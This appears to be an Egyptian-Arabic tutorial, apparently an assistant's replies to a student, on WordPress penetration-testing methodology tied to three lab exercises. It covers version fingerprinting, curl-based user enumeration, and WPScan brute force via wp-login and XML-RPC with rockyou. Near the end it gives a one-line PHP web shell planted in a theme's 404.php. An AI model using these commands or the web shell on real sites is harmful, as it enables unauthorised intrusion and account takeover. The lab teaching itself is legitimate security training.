

---

## أولاً: الفكرة العامة للملف

الملف ده بيشرح **منهجية كاملة** لاختبار اختراق مواقع WordPress — بيبدأ من إزاي تعرف إن الموقع WordPress وحتى إزاي تستغل الثغرات فيه. وإحنا في الـ 3 labs اللي عملناهم طبّقنا أجزاء مختلفة من نفس المنهجية دي.

---

## ثانياً: أهم حاجة تاخدها بعد الملف ده

بعد ما تفهم الملف ده هتقدر تمشي على أي موقع WordPress بخطوات واضحة من الأول للآخر — من غير ما تتوه أو تنسى حاجة.

---

## ثالثاً: الشرح الكامل بالعربي

---

### 📌 ليه الـ CMS هدف مهم؟

الـ CMS أو نظام إدارة المحتوى (Content Management System) هو برنامج بيخلي أي حد يعمل موقع ويب من غير ما يكتب كود. وده بالظبط اللي بيخليه هدف كبير للـ pentester لأسباب كتير:

أول حاجة هي الانتشار الواسع أو الـ ubiquity (يو-بيك-وِتي) — WordPress لوحده بيشغّل أكتر من 43% من مواقع الإنترنت، يعني لو عارف تاخده عندك فرصة في نص الإنترنت. تاني حاجة هي التعقيد أو الـ complexity (كوم-بلِك-ستي) — الموقع بيكون فيه plugins وthemes وإعدادات كتير، وكل حاجة زيادة دي ممكن تكون فيها ثغرة. تالت حاجة إن المواقع دي بتخزن بيانات المستخدمين الحساسة زي الـ passwords والإيميلات.

ده اللي شفناه بالظبط في **Lab 1** لما لاقينا الـ plugin `adrotate` فيه SQL Injection لأنه مش اتحدّث من 2014.

---

### 📌 الـ Methodology الكاملة

الملف بيقسم الـ pentest لـ 5 مراحل مترتبة:

**المرحلة الأولى هي Information Gathering and Enumeration** (إنفورميشن جاذرينج آند إنيوميريشن) 

— ومعناها جمع المعلومات والحصر. في الخطوة دي بنعرف إصدار الـ WordPress، وبنحصر الـ users والـ plugins والـ themes، وبندور على الملفات والـ directories المخفية. ده اللي عملناه في الـ 3 labs كلهم في أول خطوة بالـ Meta Tag والـ WPScan.

**المرحلة التانية هي Vulnerability Scanning** (فالنيرابيليتي سكانينج)
— ومعناها فحص الثغرات. في الخطوة دي بنستخدم searchsploit عشان نشوف الـ CVEs المعروفة على الإصدار والـ plugins اللي لاقيناهم. ده اللي عملناه في **Lab 1** لما شغّلنا `searchsploit adrotate 3.9.4` ولاقينا CVE-2014-1854.

**المرحلة التالتة هي Authentication Testing** (أوثنتيكيشن تستينج)
— ومعناها اختبار المصادقة. بنجرب نكسر الـ login إما بـ brute force على `/wp-login.php` أو عن طريق الـ XML-RPC اللي بيكون أسرع بكتير. ده اللي عملناه في **Lab 1** لما WPScan لاقى `pentester / password1` في 15 ثانية بس.

**المرحلة الرابعة هي Exploitation** (إكسبلويتيشن) — 
ومعناها الاستغلال. بنستغل الثغرات اللي لاقيناها. في **Lab 1** استغلينا الـ SQL Injection في adrotate، وفي **Lab 2** استغلينا ثغرة الـ REST API في WordPress 4.7.1، وفي **Lab 3** استغلينا الـ Directory Listing عشان نوصل للـ logs.

**المرحلة الخامسة هي Post-Exploitation** (بوست إكسبلويتيشن) — ومعناها ما بعد الاستغلال. ده اللي مشيناهوش في الـ labs بس هو الخطوة الجاية — بنثبّت web shell أو backdoor عشان نفضل داخل، وبنسحب بيانات من الـ database أو السيرفر.

---

### 📌 طرق معرفة إصدار WordPress

الملف بيذكر 7 طرق — إحنا استخدمنا اتنين منهم:

أول طريقة وأسهلها هي الـ **Meta Generator Tag** — بتفتح الـ Page Source وبتدور على كلمة generator فبتلاقي السطر ده:
```html
<meta name="generator" content="WordPress 4.4" />
```
ده اللي عملناه في الـ 3 labs كلهم.

تاني طريقة هي الـ **REST API** — بتفتح الـ URL ده:
```
/wp-json/
```
وبيجيبلك معلومات عن الموقع منها الإصدار. ده اللي استخدمناه في **Lab 2**.

باقي الطرق زي الـ readme.html والـ changelog.txt هي ملفات موجودة بـ default في كل WordPress ممكن تكشف الإصدار لو مش اتمسحوا.

---

### 📌 طرق حصر الـ Users

الملف بيذكر 3 طرق يدوية مهمة:

الطريقة الأولى هي **Author ID Brute Force** — بتجرب أرقام مختلفة في الـ URL:
```bash
curl -s -I -X GET http://wordpress.com/?author=1
```
لو رد بـ 200 يبقى في user بالـ ID ده.

الطريقة التانية هي **REST API** — ده اللي استخدمناه في **Lab 2** بالـ exploit 41497.php:
```bash
curl http://wordpress.com/wp-json/wp/v2/users
```

الطريقة التالتة هي **Login Error Messages** — بتجرب تدخل بيوزر غلط، لو قاللك "كلمة المرور غلط" يبقى اليوزر موجود. WPScan بيعمل ده تلقائياً وده اللي أكّد اليوزر `pentester` في **Lab 1**.

---

### 📌 الملفات والمسارات الـ Default المهمة

دي حاجة لازم تحفظها — دي مسارات موجودة في كل موقع WordPress في العالم:

مسار `/wp-login.php` هو صفحة الدخول — شفناه في الـ 3 labs.
مسار `/wp-admin/` هو لوحة التحكم — الهدف النهائي في Lab 1 و2.
ملف `xmlrpc.php` هو بروتوكول قديم بيسمح بالـ brute force السريع — استخدمناه في **Lab 1** وخلى WPScan يلاقي الباسورد في 15 ثانية.
مسار `/wp-content/uploads/` هو مكان الملفات المرفوعة وغالباً بيكون فيه Directory Listing — ده اللي استغلناه في **Lab 3**.
ملف `/wp-config.php` هو أخطر ملف في أي موقع WordPress لأنه فيه باسورد الـ database — لو وصلتله انتهت اللعبة.

---

### 📌 الـ Topics اللي الملف بيذكرها ولسه مشيناهاش

الملف بيذكر موضوعين مهمين هنشوفهم في labs جاية:

الأول هو **Arbitrary File Upload Vulnerability** (آربيتراري فايل أبلود فالنيرابيليتي) — ومعناه ثغرة رفع ملفات عشوائية. يعني plugin بيسمحلك ترفع أي ملف حتى لو PHP shell — ده بيديك تحكم كامل في السيرفر.

التاني هو **Stored XSS** (ستورد كروس سايت سكريبتينج) — CVE-2020-9371 — ومعناه إن الـ XSS بيتخزن في الـ database وبيأثر على كل مستخدم يفتح الصفحة.

---

## رابعاً: جدول المصطلحات

| المصطلح الإنجليزي | المعنى بالعربي | النطق |
|---|---|---|
| Content Management System | نظام إدارة المحتوى | كونتنت مانجمنت سيستم |
| Ubiquity | الانتشار الواسع | يو-بيك-وِتي |
| Complexity | التعقيد | كوم-بلِك-ستي |
| Enumeration | الحصر والتعداد | إنيوميريشن |
| Vulnerability Scanning | فحص الثغرات | فالنيرابيليتي سكانينج |
| Authentication Testing | اختبار المصادقة | أوثنتيكيشن تستينج |
| Exploitation | الاستغلال | إكسبلويتيشن |
| Post-Exploitation | ما بعد الاستغلال | بوست إكسبلويتيشن |
| Brute Force | الهجوم بالقوة | بروت فورس |
| Directory Listing | عرض محتوى المجلدات | دايركتوري ليستينج |
| Arbitrary File Upload | رفع ملفات عشوائية | آربيتراري فايل أبلود |
| Backdoor | باب خلفي للوصول | باك دور |
| Web Shell | أداة تحكم عن بُعد عبر الويب | ويب شيل |
| Plugin | إضافة | بلجين |
| Theme | قالب | ثيم |
| Meta Generator Tag | وسم المولّد في الكود | ميتا جينيريتر تاج |
| REST API | واجهة برمجية للتواصل مع الموقع | ريست إيه-بي-آي |
| XML-RPC | بروتوكول قديم للتحكم عن بُعد | إكس-إم-إل آر-بي-سي |

---

## خامساً: ملخص الشرح والنقاط العملية

الملف ده هو الـ framework النظري اللي إحنا طبّقناه عملياً في الـ labs. كل lab كان بيركز على مرحلة مختلفة من الـ methodology — Lab 1 غطّى Enumeration وAuthentication وExploitation، Lab 2 غطّى Version Fingerprinting وUser Enumeration، وLab 3 غطّى Directory Enumeration والـ Misconfiguration. الـ labs الجاية هتغطي الـ File Upload والـ XSS والـ Black-Box Pentest الكامل. 🎯

الملف فيه الـ topics دي بالظبط اللي شرحتهالك — بس أنا قدر أضيف عليه من معرفتي حاجات مهمة مش موجودة في الملف بس بتكمّله:

---

### حاجات مش في الملف بس مهمة تعرفها:

**١. الـ WPScan API Token** الملف ما اتكلمش عنه — بس إحنا شفناه في كل الـ labs:

```
[!] No WPScan API Token given, vulnerability data has not been output
```

يعني من غير الـ token، الـ WPScan مش بيجيبلك الـ CVEs تلقائياً على الـ plugins. عشان تاخد token مجاني بـ 25 request يومياً:

```
https://wpscan.com/register
```

وبعدين تضيفه في الأمر:

```bash
wpscan --url [URL] --api-token [TOKEN] --enumerate u,p,t
```

---

**٢. الفرق بين الـ XML-RPC والـ wp-login.php في الـ Brute Force**

الملف ذكر الاتنين بس ما وضّحش الفرق المهم:

||wp-login.php|XML-RPC|
|---|---|---|
|السرعة|بطيء — request لكل باسورد|سريع جداً — آلاف الباسوردات في request واحد|
|الـ Detection|سهل يتحشف|أصعب|
|الـ Lockout|ممكن يلوك الأكاونت|ممكن يتجنب الـ lockout|

ده اللي خلى WPScan في **Lab 1** يلاقي الباسورد في 15 ثانية بس.

---

**٣. الـ WordPress User Roles**

الملف ذكرهم بس ما ربطهمش بالـ pentest — الأهم بالنسبالك:

لو لاقيت **Administrator** = تقدر تعمل كل حاجة جوا الـ dashboard زي رفع plugins وتعديل الـ PHP code. لو لاقيت **Editor** = تقدر تعدّل المحتوى بس مش تثبّت plugins. لو لاقيت **Subscriber** = محدوش — بس ممكن تستخدمه كـ foothold.

---

**٤. بعد ما تدخل الـ wp-admin إيه؟**

الملف ذكر الـ Post-Exploitation بشكل عام — بس عملياً لما تدخل الـ wp-admin كـ admin، أسرع طريقة تعمل web shell هي:

الـ Theme Editor — روح:

```
Appearance → Theme Editor → 404.php
```

واكتب فيه:

```php
<?php system($_GET['cmd']); ?>
```

وبعدين تناديه من الـ URL:

```
/wp-content/themes/[theme]/404.php?cmd=whoami
```

ده اللي هيجي في الـ labs الجاية. 🎯

---

يعني الملف كويس كـ framework نظري، بس الحاجات دي اللي بتفرق في العملي. عايز أشرح أي نقطة منهم بتفصيل أكتر؟


تمام! هشرح الجزئين دول بالتفصيل من الأول.

---

## الجزء الأول: Authentication Testing — إزاي كسرنا الـ Login؟

### الفكرة الأساسية

عندنا موقع WordPress وعارفين إن في user اسمه `pentester` — بس مش عارفين الباسورد. إيه اللي نعمله؟

**نجرب كل الباسوردات الموجودة في ملف rockyou.txt واحدة واحدة** — ده اللي اسمه Brute Force (بروت فورس).

---

### طريقة ١: عن طريق `/wp-login.php`

دي الطريقة العادية — WPScan بيروح لصفحة الـ login ويجرب كل باسورد:

```
جرّب: pentester + 123456    → غلط
جرّب: pentester + password  → غلط
جرّب: pentester + password1 → ✅ صح!
```

**المشكلة:** كل محاولة = request منفصل على الموقع. بطيء جداً.

---

### طريقة ٢: عن طريق XML-RPC — الأسرع

**إيه هو الـ XML-RPC؟**

ده ملف موجود في كل WordPress على المسار:

```
/xmlrpc.php
```

وظيفته إنه يسمح لتطبيقات تانية تتحكم في الموقع عن بُعد — زي لما تنشر مقال من تطبيق موبايل مثلاً.

**ليه أسرع في الـ Brute Force؟**

في الـ XML-RPC، فيه method اسمها `system.multicall` — بتسمحلك تبعت **آلاف الباسوردات في request واحد بس**:

```
Request عادي على wp-login.php:
┌─────────────────────┐
│ جرّب: password1     │  ← request 1
└─────────────────────┘
┌─────────────────────┐
│ جرّب: password2     │  ← request 2
└─────────────────────┘
... 1000 request لـ 1000 باسورد

Request على XML-RPC:
┌─────────────────────────────────────┐
│ جرّب: password1, password2, ...     │  ← request واحد بس!
│ password999, password1000           │
└─────────────────────────────────────┘
```

**ده اللي حصل في Lab 1** — WPScan شاف إن الـ XML-RPC مفعّل تلقائياً واستخدمه، ولاقى الباسورد في 15 ثانية بدل ساعات.

تمام! هشرح الاتنين بالتفصيل مع الأوامر العملية.

---

## أولاً: Brute Force عن طريق `/wp-login.php`

### الأمر:

```bash
wpscan --url http://wordpress.com/ --usernames pentester --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
```

الفرق الوحيد عن اللي عملناه في Lab 1 هو `--password-attack wp-login` — ده بيقوله استخدم صفحة الـ login العادية مش الـ XML-RPC.

### إيه اللي بيحصل جوا:

```
WPScan بيفتح /wp-login.php
بيبعت:  username=pentester & password=123456    → غلط
بيبعت:  username=pentester & password=password  → غلط
بيبعت:  username=pentester & password=password1 → ✅ صح
```

كل محاولة = request منفصل = **بطيء**.

---

## ثانياً: Brute Force عن طريق XML-RPC

### الأمر:

```bash
wpscan --url http://wordpress.com/ --usernames pentester --passwords /usr/share/wordlists/rockyou.txt --password-attack xmlrpc
```

### إيه اللي بيحصل جوا:

WPScan بيفتح `/xmlrpc.php` ويبعتله request زي ده:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param><value><array><data>
      <value><struct>
        <member><name>methodName</name>
          <value>wp.getUsersBlogs</value></member>
        <member><name>params</name><value><array><data>
          <value>pentester</value>
          <value>password1</value>
        </data></array></value></member>
      </struct></value>
      <!-- باسورد 2، 3، 4 ... كلهم في نفس الـ request -->
    </data></array></value></param>
  </params>
</methodCall>
```

يعني **آلاف الباسوردات في request واحد** = سريع جداً.

---

## الفرق العملي بين الاتنين

||wp-login.php|XML-RPC|
|---|---|---|
|الأمر|`--password-attack wp-login`|`--password-attack xmlrpc`|
|السرعة|بطيء|سريع جداً|
|الشرط|دايماً موجود|لازم يكون مفعّل|
|لو مش مفعّل|✅ دايماً شغّال|❌ مش هيشتغل|
|WPScan بيختار|لو XML-RPC مفعّل → بيختاره تلقائياً||

---

## في Lab 1 إيه اللي حصل بالظبط؟

إحنا ما حددناش نوع الهجوم — كتبنا الأمر ده بس:

```bash
wpscan --url [URL] --usernames pentester --passwords /usr/share/wordlists/rockyou.txt
```

WPScan شاف في الـ output بتاعه إن الـ XML-RPC مفعّل:

```
[+] XML-RPC seems to be enabled
```

فاختار تلقائياً الـ XML-RPC لأنه أسرع — وده اللي خلّاه يلاقي الباسورد في **15 ثانية** 🎯

---

## الجزء الثاني: طرق حصر الـ Users — إزاي عرفنا في مين؟

### الفكرة الأساسية

قبل ما نعمل Brute Force، لازم نعرف **اسم الـ user الأول** — مش هنجرب كل الأسماء الموجودة في العالم. إزاي نعرف مين الـ users اللي على الموقع؟

---

### الطريقة الأولى: Author ID Brute Force

**الفكرة:** كل user في WordPress عنده رقم ID — 1، 2، 3، إلخ. لما تفتح الـ URL ده:

```
http://wordpress.com/?author=1
```

الموقع بيعمل redirect لصفحة اليوزر اللي عنده ID رقم 1، والـ URL الجديد بيكون فيه اسم اليوزر.

**مثال عملي:**

```bash
curl -s -I -X GET http://wordpress.com/?author=1
```

الـ `-I` معناها جيبلي الـ headers بس — هتلاقي في الـ response سطر زي ده:

```
Location: http://wordpress.com/author/admin/
```

**اسم اليوزر ظهر في الـ URL = `admin`** 🎯

لو جربت `?author=2` وردّ بـ 404 يبقى مفيش user تاني.

---

### الطريقة التانية: REST API

**الفكرة:** WordPress 4.7.1 وأحدث منه بيكشف قايمة الـ users كاملة من غير أي login عن طريق الـ REST API.

```bash
curl http://wordpress.com/wp-json/wp/v2/users
```

الرد بيكون JSON (جيسون) — يعني بيانات منظمة زي ده:

```json
[
  {
    "id": 1,
    "name": "admin",
    "slug": "admin"
  },
  {
    "id": 2,
    "name": "pentester",
    "slug": "pentester"
  }
]
```

**ده اللي استخدمناه في Lab 2** — الـ exploit 41497.php ما عملش غير إنه بعت الـ request ده وعرض النتيجة بشكل أحلى.

**ليه ده ثغرة؟** لأن المفروض بيانات الـ users دي تكون خاصة — المهاجم مفروض ميعرفهاش من غير صلاحية.

---

### الطريقة التالتة: Login Error Messages

**الفكرة:** WordPress بيديك رسائل خطأ مختلفة بناءً على اللي غلط:

|اللي بتكتبه|رسالة WordPress|
|---|---|
|يوزر مش موجود|"Invalid username"|
|يوزر موجود + باسورد غلط|"The password you entered is incorrect"|

**يعني إيه ده عملياً؟**

لو جربت تدخل بـ `xyz_msh_mwgood` وقاللك "Invalid username" = اليوزر ده مش موجود.

لو جربت بـ `pentester` وقاللك "incorrect password" = **اليوزر ده موجود!** حتى لو الباسورد غلط.

**WPScan بيعمل ده تلقائياً** — بيجرب أسماء كتير ويشوف أنهي واحد بيرجعله "incorrect password" بدل "invalid username". ده اللي أكّد إن `pentester` موجود في **Lab 1**.

---

## ملخص الفرق بين الـ 3 طرق

|الطريقة|إزاي بتشتغل|استخدمناها فين|
|---|---|---|
|Author ID Brute Force|بتجرب `?author=1,2,3` في الـ URL|WPScan عملها تلقائياً في Lab 1|
|REST API|بتفتح `/wp-json/wp/v2/users`|Lab 2 بالـ exploit 41497.php|
|Login Error Messages|بتلاحظ الفرق في رسائل الخطأ|WPScan عملها تلقائياً في Lab 1|

الـ 3 طرق دول بيكملوا بعض — WPScan بيعمل الـ 3 مع بعض في نفس الوقت لما تقوله `--enumerate u` 🎯